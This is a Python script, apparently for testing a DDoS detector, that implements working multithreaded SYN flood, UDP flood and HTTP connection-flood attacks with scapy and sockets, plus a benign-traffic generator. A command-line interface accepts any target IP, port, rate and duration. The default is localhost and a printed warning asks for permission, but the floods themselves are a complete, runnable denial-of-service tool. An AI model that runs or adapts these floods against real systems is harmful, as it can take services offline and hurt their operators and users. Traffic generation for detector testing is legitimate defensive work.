#!/usr/bin/env python3
"""
DDoS Attack Simulator for Testing
This script simulates various types of network attacks on localhost
"""

import socket
import random
import time
import threading
from scapy.all import IP, TCP, UDP, send, RandShort
import argparse

class DDoSSimulator:
    """Simulate DDoS attacks for testing"""
    
    def __init__(self, target_ip='127.0.0.1', target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.threads = []
        self.stats = {
            'packets_sent': 0,
            'start_time': None
        }
    
    def syn_flood(self, duration=30, rate=100):
        """SYN Flood attack"""
        print(f"Starting SYN Flood attack on {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration}s, Rate: {rate} packets/sec")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        def send_syn_packets():
            while self.running and (time.time() - self.stats['start_time']) < duration:
                try:
                    # Create SYN packet with random source port
                    src_port = random.randint(1024, 65535)
                    
                    packet = IP(dst=self.target_ip) / TCP(
                        sport=src_port,
                        dport=self.target_port,
                        flags='S',  # SYN flag
                        seq=random.randint(1000, 9000)
                    )
                    
                    send(packet, verbose=0)
                    self.stats['packets_sent'] += 1
                    
                    # Control rate
                    time.sleep(1.0 / rate)
                    
                except Exception as e:
                    print(f"Error sending packet: {e}")
                    break
        
        # Start multiple threads
        num_threads = min(10, rate // 10 + 1)
        for i in range(num_threads):
            thread = threading.Thread(target=send_syn_packets)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        print(f"Started {num_threads} attack threads")
        
        # Wait for completion
        try:
            while self.running and (time.time() - self.stats['start_time']) < duration:
                elapsed = time.time() - self.stats['start_time']
                print(f"\rElapsed: {elapsed:.1f}s | Packets sent: {self.stats['packets_sent']}", end='')
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\nAttack interrupted by user")
        
        self.stop()
        print(f"\n\nAttack completed!")
        print(f"Total packets sent: {self.stats['packets_sent']}")
        print(f"Average rate: {self.stats['packets_sent']/duration:.1f} packets/sec")
    
    def udp_flood(self, duration=30, rate=100):
        """UDP Flood attack"""
        print(f"Starting UDP Flood attack on {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration}s, Rate: {rate} packets/sec")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        def send_udp_packets():
            while self.running and (time.time() - self.stats['start_time']) < duration:
                try:
                    # Create UDP packet with random data
                    data_size = random.randint(64, 1024)
                    data = bytes([random.randint(0, 255) for _ in range(data_size)])
                    
                    packet = IP(dst=self.target_ip) / UDP(
                        sport=RandShort(),
                        dport=self.target_port
                    ) / data
                    
                    send(packet, verbose=0)
                    self.stats['packets_sent'] += 1
                    
                    # Control rate
                    time.sleep(1.0 / rate)
                    
                except Exception as e:
                    print(f"Error sending packet: {e}")
                    break
        
        # Start multiple threads
        num_threads = min(10, rate // 10 + 1)
        for i in range(num_threads):
            thread = threading.Thread(target=send_udp_packets)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        print(f"Started {num_threads} attack threads")
        
        # Wait for completion
        try:
            while self.running and (time.time() - self.stats['start_time']) < duration:
                elapsed = time.time() - self.stats['start_time']
                print(f"\rElapsed: {elapsed:.1f}s | Packets sent: {self.stats['packets_sent']}", end='')
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\nAttack interrupted by user")
        
        self.stop()
        print(f"\n\nAttack completed!")
        print(f"Total packets sent: {self.stats['packets_sent']}")
        print(f"Average rate: {self.stats['packets_sent']/duration:.1f} packets/sec")
    
    def http_flood(self, duration=30, rate=50):
        """HTTP Flood attack (TCP-based)"""
        print(f"Starting HTTP Flood attack on {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration}s, Rate: {rate} requests/sec")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        def send_http_requests():
            while self.running and (time.time() - self.stats['start_time']) < duration:
                try:
                    # Create TCP connection attempt
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    
                    try:
                        sock.connect((self.target_ip, self.target_port))
                        
                        # Send HTTP GET request
                        http_request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n"
                        sock.send(http_request.encode())
                        
                        self.stats['packets_sent'] += 1
                    except:
                        pass
                    finally:
                        sock.close()
                    
                    # Control rate
                    time.sleep(1.0 / rate)
                    
                except Exception as e:
                    pass
        
        # Start multiple threads
        num_threads = min(10, rate // 5 + 1)
        for i in range(num_threads):
            thread = threading.Thread(target=send_http_requests)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        print(f"Started {num_threads} attack threads")
        
        # Wait for completion
        try:
            while self.running and (time.time() - self.stats['start_time']) < duration:
                elapsed = time.time() - self.stats['start_time']
                print(f"\rElapsed: {elapsed:.1f}s | Requests sent: {self.stats['packets_sent']}", end='')
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\nAttack interrupted by user")
        
        self.stop()
        print(f"\n\nAttack completed!")
        print(f"Total requests sent: {self.stats['packets_sent']}")
        print(f"Average rate: {self.stats['packets_sent']/duration:.1f} requests/sec")
    
    def normal_traffic(self, duration=30, rate=10):
        """Generate normal-looking traffic for testing"""
        print(f"Generating normal traffic to {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration}s, Rate: {rate} packets/sec")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        def send_normal_packets():
            while self.running and (time.time() - self.stats['start_time']) < duration:
                try:
                    # Alternate between different packet types
                    packet_type = random.choice(['syn', 'ack', 'data'])
                    
                    if packet_type == 'syn':
                        packet = IP(dst=self.target_ip) / TCP(
                            sport=RandShort(),
                            dport=self.target_port,
                            flags='S'
                        )
                    elif packet_type == 'ack':
                        packet = IP(dst=self.target_ip) / TCP(
                            sport=RandShort(),
                            dport=self.target_port,
                            flags='A'
                        )
                    else:
                        data = b'Normal data packet'
                        packet = IP(dst=self.target_ip) / TCP(
                            sport=RandShort(),
                            dport=self.target_port,
                            flags='PA'
                        ) / data
                    
                    send(packet, verbose=0)
                    self.stats['packets_sent'] += 1
                    
                    # Normal traffic has variable timing
                    time.sleep(random.uniform(0.5, 2.0) / rate)
                    
                except Exception as e:
                    print(f"Error sending packet: {e}")
                    break
        
        # Single thread for normal traffic
        thread = threading.Thread(target=send_normal_packets)
        thread.daemon = True
        thread.start()
        self.threads.append(thread)
        
        print("Started normal traffic generation")
        
        # Wait for completion
        try:
            while self.running and (time.time() - self.stats['start_time']) < duration:
                elapsed = time.time() - self.stats['start_time']
                print(f"\rElapsed: {elapsed:.1f}s | Packets sent: {self.stats['packets_sent']}", end='')
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\nTraffic generation interrupted by user")
        
        self.stop()
        print(f"\n\nTraffic generation completed!")
        print(f"Total packets sent: {self.stats['packets_sent']}")
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        for thread in self.threads:
            thread.join(timeout=2)
        self.threads = []

def main():
    parser = argparse.ArgumentParser(description='DDoS Attack Simulator for Testing')
    parser.add_argument('--target', '-t', default='127.0.0.1', help='Target IP address')
    parser.add_argument('--port', '-p', type=int, default=80, help='Target port')
    parser.add_argument('--type', '-y', choices=['syn', 'udp', 'http', 'normal'], 
                       default='syn', help='Attack type')
    parser.add_argument('--duration', '-d', type=int, default=30, 
                       help='Attack duration in seconds')
    parser.add_argument('--rate', '-r', type=int, default=100, 
                       help='Packets/requests per second')
    
    args = parser.parse_args()
    
    print("\n" + "="*70)
    print("DDoS ATTACK SIMULATOR - FOR TESTING PURPOSES ONLY")
    print("="*70)
    print("\nWARNING: This tool is for educational and testing purposes only!")
    print("Only use on systems you own or have permission to test.")
    print("\n" + "="*70 + "\n")
    
    simulator = DDoSSimulator(target_ip=args.target, target_port=args.port)
    
    try:
        if args.type == 'syn':
            simulator.syn_flood(duration=args.duration, rate=args.rate)
        elif args.type == 'udp':
            simulator.udp_flood(duration=args.duration, rate=args.rate)
        elif args.type == 'http':
            simulator.http_flood(duration=args.duration, rate=args.rate)
        elif args.type == 'normal':
            simulator.normal_traffic(duration=args.duration, rate=args.rate)
    except KeyboardInterrupt:
        print("\n\nStopping simulator...")
        simulator.stop()
    
    print("\nSimulator stopped.")

if __name__ == '__main__':
    main()